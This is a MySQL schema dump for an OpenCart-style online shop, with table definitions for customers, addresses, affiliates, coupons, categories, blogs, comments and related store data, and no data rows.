
/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
DROP TABLE IF EXISTS `oc_address`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_address` (
  `address_id` int(11) NOT NULL AUTO_INCREMENT,
  `customer_id` int(11) NOT NULL,
  `firstname` varchar(32) NOT NULL,
  `lastname` varchar(32) NOT NULL,
  `company` varchar(40) NOT NULL,
  `address_1` varchar(128) NOT NULL,
  `address_2` varchar(128) NOT NULL,
  `city` varchar(128) NOT NULL,
  `postcode` varchar(10) NOT NULL,
  `country_id` int(11) NOT NULL DEFAULT '0',
  `zone_id` int(11) NOT NULL DEFAULT '0',
  `custom_field` text NOT NULL,
  PRIMARY KEY (`address_id`),
  KEY `customer_id` (`customer_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_affiliate`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_affiliate` (
  `affiliate_id` int(11) NOT NULL AUTO_INCREMENT,
  `firstname` varchar(32) NOT NULL,
  `lastname` varchar(32) NOT NULL,
  `email` varchar(96) NOT NULL,
  `telephone` varchar(32) NOT NULL,
  `fax` varchar(32) NOT NULL,
  `password` varchar(40) NOT NULL,
  `salt` varchar(9) NOT NULL,
  `company` varchar(40) NOT NULL,
  `website` varchar(255) NOT NULL,
  `address_1` varchar(128) NOT NULL,
  `address_2` varchar(128) NOT NULL,
  `city` varchar(128) NOT NULL,
  `postcode` varchar(10) NOT NULL,
  `country_id` int(11) NOT NULL,
  `zone_id` int(11) NOT NULL,
  `code` varchar(64) NOT NULL,
  `commission` decimal(4,2) NOT NULL DEFAULT '0.00',
  `tax` varchar(64) NOT NULL,
  `payment` varchar(6) NOT NULL,
  `cheque` varchar(100) NOT NULL,
  `paypal` varchar(64) NOT NULL,
  `bank_name` varchar(64) NOT NULL,
  `bank_branch_number` varchar(64) NOT NULL,
  `bank_swift_code` varchar(64) NOT NULL,
  `bank_account_name` varchar(64) NOT NULL,
  `bank_account_number` varchar(64) NOT NULL,
  `ip` varchar(40) NOT NULL,
  `status` tinyint(1) NOT NULL,
  `approved` tinyint(1) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`affiliate_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_affiliate_activity`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_affiliate_activity` (
  `activity_id` int(11) NOT NULL AUTO_INCREMENT,
  `affiliate_id` int(11) NOT NULL,
  `key` varchar(64) NOT NULL,
  `data` text NOT NULL,
  `ip` varchar(40) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`activity_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_affiliate_login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_affiliate_login` (
  `affiliate_login_id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(96) NOT NULL,
  `ip` varchar(40) NOT NULL,
  `total` int(4) NOT NULL,
  `date_added` datetime NOT NULL,
  `date_modified` datetime NOT NULL,
  PRIMARY KEY (`affiliate_login_id`),
  KEY `email` (`email`),
  KEY `ip` (`ip`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_affiliate_transaction`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_affiliate_transaction` (
  `affiliate_transaction_id` int(11) NOT NULL AUTO_INCREMENT,
  `affiliate_id` int(11) NOT NULL,
  `order_id` int(11) NOT NULL,
  `description` text NOT NULL,
  `amount` decimal(15,4) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`affiliate_transaction_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_agoo_signer`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_agoo_signer` (
  `id` int(11) NOT NULL,
  `pointer` varchar(128) NOT NULL,
  `customer_id` int(11) NOT NULL,
  `email` varchar(96) NOT NULL,
  `date` datetime NOT NULL,
  KEY `pointer` (`pointer`),
  KEY `id` (`id`),
  KEY `customer_id` (`customer_id`),
  KEY `date` (`date`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_api`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_api` (
  `api_id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(64) NOT NULL,
  `firstname` varchar(64) NOT NULL,
  `lastname` varchar(64) NOT NULL,
  `password` text NOT NULL,
  `status` tinyint(1) NOT NULL,
  `date_added` datetime NOT NULL,
  `date_modified` datetime NOT NULL,
  PRIMARY KEY (`api_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_attribute`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_attribute` (
  `attribute_id` int(11) NOT NULL AUTO_INCREMENT,
  `attribute_group_id` int(11) NOT NULL,
  `sort_order` int(3) NOT NULL,
  PRIMARY KEY (`attribute_id`)
) ENGINE=MyISAM AUTO_INCREMENT=50 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_attribute_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_attribute_description` (
  `attribute_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `name` varchar(64) NOT NULL,
  PRIMARY KEY (`attribute_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_attribute_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_attribute_group` (
  `attribute_group_id` int(11) NOT NULL AUTO_INCREMENT,
  `sort_order` int(3) NOT NULL,
  PRIMARY KEY (`attribute_group_id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_attribute_group_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_attribute_group_description` (
  `attribute_group_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `name` varchar(64) NOT NULL,
  PRIMARY KEY (`attribute_group_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_banner`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_banner` (
  `banner_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(64) NOT NULL,
  `status` tinyint(1) NOT NULL,
  PRIMARY KEY (`banner_id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_banner_image`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_banner_image` (
  `banner_image_id` int(11) NOT NULL AUTO_INCREMENT,
  `banner_id` int(11) NOT NULL,
  `link` varchar(255) NOT NULL,
  `image` varchar(255) NOT NULL,
  `sort_order` int(3) NOT NULL DEFAULT '0',
  PRIMARY KEY (`banner_image_id`)
) ENGINE=MyISAM AUTO_INCREMENT=157 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_banner_image_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_banner_image_description` (
  `banner_image_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `banner_id` int(11) NOT NULL,
  `title` varchar(64) NOT NULL,
  `banner_description` varchar(1024) NOT NULL,
  PRIMARY KEY (`banner_image_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_blog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_blog` (
  `blog_id` int(11) NOT NULL AUTO_INCREMENT,
  `image` varchar(255) DEFAULT NULL,
  `design` text NOT NULL,
  `parent_id` int(11) NOT NULL DEFAULT '0',
  `top` tinyint(1) NOT NULL,
  `column` int(3) NOT NULL,
  `sort_order` int(3) NOT NULL DEFAULT '0',
  `status` tinyint(1) NOT NULL,
  `customer_group_id` int(2) NOT NULL,
  `date_added` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `date_modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`blog_id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_blog_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_blog_description` (
  `blog_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL DEFAULT '',
  `description` text NOT NULL,
  `meta_h1` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `meta_title` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL,
  `meta_description` varchar(255) NOT NULL,
  `meta_keyword` varchar(255) NOT NULL,
  PRIMARY KEY (`blog_id`,`language_id`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_blog_to_layout`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_blog_to_layout` (
  `blog_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL,
  `layout_id` int(11) NOT NULL,
  PRIMARY KEY (`blog_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_blog_to_store`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_blog_to_store` (
  `blog_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL,
  PRIMARY KEY (`blog_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_category` (
  `category_id` int(11) NOT NULL AUTO_INCREMENT,
  `image` varchar(255) DEFAULT NULL,
  `parent_id` int(11) NOT NULL DEFAULT '0',
  `top` tinyint(1) NOT NULL,
  `column` int(3) NOT NULL,
  `sort_order` int(3) NOT NULL DEFAULT '0',
  `status` tinyint(1) NOT NULL,
  `date_added` datetime NOT NULL,
  `date_modified` datetime NOT NULL,
  PRIMARY KEY (`category_id`),
  KEY `parent_id` (`parent_id`)
) ENGINE=MyISAM AUTO_INCREMENT=81 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_category_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_category_description` (
  `category_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `meta_title` varchar(255) NOT NULL,
  `meta_description` varchar(255) NOT NULL,
  `meta_keyword` varchar(255) NOT NULL,
  PRIMARY KEY (`category_id`,`language_id`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_category_filter`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_category_filter` (
  `category_id` int(11) NOT NULL,
  `filter_id` int(11) NOT NULL,
  PRIMARY KEY (`category_id`,`filter_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_category_path`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_category_path` (
  `category_id` int(11) NOT NULL,
  `path_id` int(11) NOT NULL,
  `level` int(11) NOT NULL,
  PRIMARY KEY (`category_id`,`path_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_category_to_layout`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_category_to_layout` (
  `category_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL,
  `layout_id` int(11) NOT NULL,
  PRIMARY KEY (`category_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_category_to_store`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_category_to_store` (
  `category_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL,
  PRIMARY KEY (`category_id`,`store_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_comment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_comment` (
  `comment_id` int(11) NOT NULL AUTO_INCREMENT,
  `record_id` int(11) NOT NULL,
  `parent_id` int(11) NOT NULL,
  `customer_id` int(11) NOT NULL,
  `author` varchar(64) NOT NULL,
  `text` text NOT NULL,
  `rating` int(1) NOT NULL,
  `rating_mark` tinyint(1) NOT NULL DEFAULT '0',
  `sorthex` varchar(255) CHARACTER SET ascii COLLATE ascii_bin NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `language_id` int(11) NOT NULL DEFAULT '1',
  `type_id` int(11) NOT NULL DEFAULT '1',
  `cmswidget` int(11) NOT NULL,
  `date_added` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `date_modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`comment_id`),
  KEY `record_id` (`record_id`),
  KEY `rating_mark` (`rating_mark`),
  KEY `customer_id` (`customer_id`),
  KEY `rating` (`rating`),
  KEY `type_id` (`type_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_country`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_country` (
  `country_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL,
  `iso_code_2` varchar(2) NOT NULL,
  `iso_code_3` varchar(3) NOT NULL,
  `address_format` text NOT NULL,
  `postcode_required` tinyint(1) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  PRIMARY KEY (`country_id`)
) ENGINE=MyISAM AUTO_INCREMENT=227 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_coupon`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_coupon` (
  `coupon_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL,
  `code` varchar(10) NOT NULL,
  `type` char(1) NOT NULL,
  `discount` decimal(15,4) NOT NULL,
  `logged` tinyint(1) NOT NULL,
  `shipping` tinyint(1) NOT NULL,
  `total` decimal(15,4) NOT NULL,
  `date_start` date NOT NULL DEFAULT '0000-00-00',
  `date_end` date NOT NULL DEFAULT '0000-00-00',
  `uses_total` int(11) NOT NULL,
  `uses_customer` varchar(11) NOT NULL,
  `status` tinyint(1) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`coupon_id`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_coupon_category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_coupon_category` (
  `coupon_id` int(11) NOT NULL,
  `category_id` int(11) NOT NULL,
  PRIMARY KEY (`coupon_id`,`category_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_coupon_history`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_coupon_history` (
  `coupon_history_id` int(11) NOT NULL AUTO_INCREMENT,
  `coupon_id` int(11) NOT NULL,
  `order_id` int(11) NOT NULL,
  `customer_id` int(11) NOT NULL,
  `amount` decimal(15,4) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`coupon_history_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_coupon_product`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_coupon_product` (
  `coupon_product_id` int(11) NOT NULL AUTO_INCREMENT,
  `coupon_id` int(11) NOT NULL,
  `product_id` int(11) NOT NULL,
  PRIMARY KEY (`coupon_product_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_currency`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_currency` (
  `currency_id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(32) NOT NULL,
  `code` varchar(3) NOT NULL,
  `symbol_left` varchar(12) NOT NULL,
  `symbol_right` varchar(12) NOT NULL,
  `decimal_place` char(1) NOT NULL,
  `value` float(15,8) NOT NULL,
  `status` tinyint(1) NOT NULL,
  `date_modified` datetime NOT NULL,
  PRIMARY KEY (`currency_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_custom_field`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_custom_field` (
  `custom_field_id` int(11) NOT NULL AUTO_INCREMENT,
  `type` varchar(32) NOT NULL,
  `value` text NOT NULL,
  `location` varchar(7) NOT NULL,
  `status` tinyint(1) NOT NULL,
  `sort_order` int(3) NOT NULL,
  PRIMARY KEY (`custom_field_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_custom_field_customer_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_custom_field_customer_group` (
  `custom_field_id` int(11) NOT NULL,
  `customer_group_id` int(11) NOT NULL,
  `required` tinyint(1) NOT NULL,
  PRIMARY KEY (`custom_field_id`,`customer_group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_custom_field_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_custom_field_description` (
  `custom_field_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `name` varchar(128) NOT NULL,
  PRIMARY KEY (`custom_field_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_custom_field_value`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_custom_field_value` (
  `custom_field_value_id` int(11) NOT NULL AUTO_INCREMENT,
  `custom_field_id` int(11) NOT NULL,
  `sort_order` int(3) NOT NULL,
  PRIMARY KEY (`custom_field_value_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_custom_field_value_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_custom_field_value_description` (
  `custom_field_value_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `custom_field_id` int(11) NOT NULL,
  `name` varchar(128) NOT NULL,
  PRIMARY KEY (`custom_field_value_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_customer`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_customer` (
  `customer_id` int(11) NOT NULL AUTO_INCREMENT,
  `customer_group_id` int(11) NOT NULL,
  `store_id` int(11) NOT NULL DEFAULT '0',
  `firstname` varchar(32) NOT NULL,
  `lastname` varchar(32) NOT NULL,
  `avatar` varchar(255) DEFAULT NULL,
  `email` varchar(96) NOT NULL,
  `telephone` varchar(32) NOT NULL,
  `fax` varchar(32) NOT NULL,
  `password` varchar(40) NOT NULL,
  `salt` varchar(9) NOT NULL,
  `cart` text,
  `wishlist` text,
  `newsletter` tinyint(1) NOT NULL DEFAULT '0',
  `address_id` int(11) NOT NULL DEFAULT '0',
  `custom_field` text NOT NULL,
  `ip` varchar(40) NOT NULL,
  `status` tinyint(1) NOT NULL,
  `approved` tinyint(1) NOT NULL,
  `safe` tinyint(1) NOT NULL,
  `token` varchar(255) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`customer_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_customer_activity`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_customer_activity` (
  `activity_id` int(11) NOT NULL AUTO_INCREMENT,
  `customer_id` int(11) NOT NULL,
  `key` varchar(64) NOT NULL,
  `data` text NOT NULL,
  `ip` varchar(40) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`activity_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_customer_ban_ip`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_customer_ban_ip` (
  `customer_ban_ip_id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` varchar(40) NOT NULL,
  PRIMARY KEY (`customer_ban_ip_id`),
  KEY `ip` (`ip`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_customer_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_customer_group` (
  `customer_group_id` int(11) NOT NULL AUTO_INCREMENT,
  `approval` int(1) NOT NULL,
  `sort_order` int(3) NOT NULL,
  PRIMARY KEY (`customer_group_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_customer_group_description`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_customer_group_description` (
  `customer_group_id` int(11) NOT NULL,
  `language_id` int(11) NOT NULL,
  `name` varchar(32) NOT NULL,
  `description` text NOT NULL,
  PRIMARY KEY (`customer_group_id`,`language_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_customer_history`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_customer_history` (
  `customer_history_id` int(11) NOT NULL AUTO_INCREMENT,
  `customer_id` int(11) NOT NULL,
  `comment` text NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`customer_history_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_customer_ip`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_customer_ip` (
  `customer_ip_id` int(11) NOT NULL AUTO_INCREMENT,
  `customer_id` int(11) NOT NULL,
  `ip` varchar(40) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`customer_ip_id`),
  KEY `ip` (`ip`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_customer_login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_customer_login` (
  `customer_login_id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(96) NOT NULL,
  `ip` varchar(40) NOT NULL,
  `total` int(4) NOT NULL,
  `date_added` datetime NOT NULL,
  `date_modified` datetime NOT NULL,
  PRIMARY KEY (`customer_login_id`),
  KEY `email` (`email`),
  KEY `ip` (`ip`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_customer_online`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_customer_online` (
  `ip` varchar(40) NOT NULL,
  `customer_id` int(11) NOT NULL,
  `url` text NOT NULL,
  `referer` text NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`ip`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_customer_reward`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_customer_reward` (
  `customer_reward_id` int(11) NOT NULL AUTO_INCREMENT,
  `customer_id` int(11) NOT NULL DEFAULT '0',
  `order_id` int(11) NOT NULL DEFAULT '0',
  `description` text NOT NULL,
  `points` int(8) NOT NULL DEFAULT '0',
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`customer_reward_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;
DROP TABLE IF EXISTS `oc_customer_transaction`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `oc_customer_transaction` (
  `customer_transaction_id` int(11) NOT NULL AUTO_INCREMENT,
  `customer_id` int(11) NOT NULL,
  `order_id` int(11) NOT NULL,
  `description` text NOT NULL,
  `amount` decimal(15,4) NOT NULL,
  `date_added` datetime NOT NULL,
  PRIMARY KEY (`customer_transaction_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
